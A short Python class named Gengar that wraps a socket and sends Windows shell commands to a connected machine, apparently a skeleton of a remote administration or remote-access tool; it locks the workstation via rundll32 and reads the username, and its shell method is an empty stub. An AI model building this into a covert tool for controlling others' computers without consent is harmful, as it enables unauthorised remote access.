class Gengar:
    def __init__(self, sock):
        self._sock = sock

    def shell(self, cmd):
        pass

    def lock_workstation(self):
        print('Locking workstation')
        self.shell('rundll32 user32.dll,LockWorkStation')

    def username(self):
        return self.shell('echo %username%')

    def is_alive(self):
        try:
            self.shell('test')
            return True
        except ConnectionResetError:
            return False

    def __repr__(self):
        return f'Gengar at {self.username()}'
